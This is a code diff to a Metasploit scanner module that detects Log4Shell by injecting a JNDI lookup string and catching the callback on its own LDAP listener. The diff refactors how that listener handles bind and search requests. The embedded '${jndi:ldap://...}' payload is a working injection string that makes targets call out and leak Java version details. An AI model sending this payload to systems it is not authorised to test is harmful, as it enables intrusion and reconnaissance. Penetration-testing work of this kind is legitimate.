@@ -6,7 +6,7 @@
 class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
-  include Msf::Exploit::Remote::TcpServer
+  include Msf::Exploit::Remote::LDAP::Server
   include Msf::Auxiliary::Scanner
 
   def initialize
@@ -27,9 +27,6 @@ class MetasploitModule < Msf::Auxiliary
       ],
       'DisclosureDate' => '2021-12-09',
       'License' => MSF_LICENSE,
-      'DefaultOptions' => {
-        'SRVPORT' => 389
-      },
       'Notes' => {
         'Stability' => [CRASH_SAFE],
         'SideEffects' => [IOC_IN_LOGS],
@@ -54,41 +51,43 @@ class MetasploitModule < Msf::Auxiliary
     "${jndi:ldap://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{resource}/${sys:java.vendor}_${sys:java.version}}"
   end
 
-  def on_client_connect(client)
-    client.extend(Net::BER::BERParser)
-    pdu = Net::LDAP::PDU.new(client.read_ber(Net::LDAP::AsnSyntax))
-    return unless pdu.app_tag == Net::LDAP::PDU::BindRequest
+  def on_dispatch_request(client, data)
+    return if data.strip.empty?
 
-    response = [
-      pdu.message_id.to_ber,
-      [
-        Net::LDAP::ResultCodeSuccess.to_ber_enumerated, ''.to_ber, ''.to_ber
-      ].to_ber_appsequence(Net::LDAP::PDU::BindResult)
-    ].to_ber_sequence
-    client.write(response)
-
-    pdu = Net::LDAP::PDU.new(client.read_ber(Net::LDAP::AsnSyntax))
-    return unless pdu.app_tag == Net::LDAP::PDU::SearchRequest
-
-    base_object = pdu.search_parameters[:base_object].to_s
-    token, java_version = base_object.split('/', 2)
-
-    unless (context = @tokens.delete(token)).nil?
-      details = normalize_uri(context[:target_uri]).to_s
-      details << " (header: #{context[:headers].keys.first})" unless context[:headers].nil?
-      details << " (java: #{java_version})" unless java_version.blank?
-      print_good("#{peer} - Log4Shell found via #{details}")
-      report_vuln(
-        host: context[:rhost],
-        port: context[:rport],
-        info: "Module #{fullname} detected Log4Shell vulnerability via #{details}",
-        name: name,
-        refs: references
+    data.extend(Net::BER::Extensions::String)
+    pdu = Net::LDAP::PDU.new(data.read_ber!(Net::LDAP::AsnSyntax))
+    case pdu.app_tag
+    when Net::LDAP::PDU::BindRequest # bind request
+      client.authenticated = true
+      resp = service.encode_ldap_response(
+        pdu.message_id,
+        Net::LDAP::ResultCodeSuccess,
+        '',
+        '',
+        Net::LDAP::PDU::BindResult
       )
+    when Net::LDAP::PDU::SearchRequest
+      base_object = pdu.search_parameters[:base_object].to_s
+      token, java_version = base_object.split('/', 2)
+
+      if (context = @tokens.delete(token))
+        details = normalize_uri(context[:target_uri]).to_s
+        details << " (header: #{context[:headers].keys.first})" unless context[:headers].nil?
+        details << " (java: #{java_version})" unless java_version.blank?
+        print_good("#{peer} - Log4Shell found via #{details}")
+        report_vuln(
+          host: context[:rhost],
+          port: context[:rport],
+          info: "Module #{fullname} detected Log4Shell vulnerability via #{details}",
+          name: name,
+          refs: references
+        )
+      end
     end
+
+    resp.nil? ? client.close : on_send_response(client, resp)
   rescue Net::LDAP::PDU::Error => e
     vprint_error("#{peer} - #{e}")
-  ensure
     service.close_client(client)
   end
 
@@ -104,7 +103,7 @@ class MetasploitModule < Msf::Auxiliary
     @tokens = {}
     # always disable SSL because the LDAP server doesn't use it but the setting is shared with the HTTP requests
     begin
-      start_service('SSL' => false)
+      start_service
     rescue Rex::BindFailed => e
       fail_with(Failure::BadConfig, e.to_s)
     end
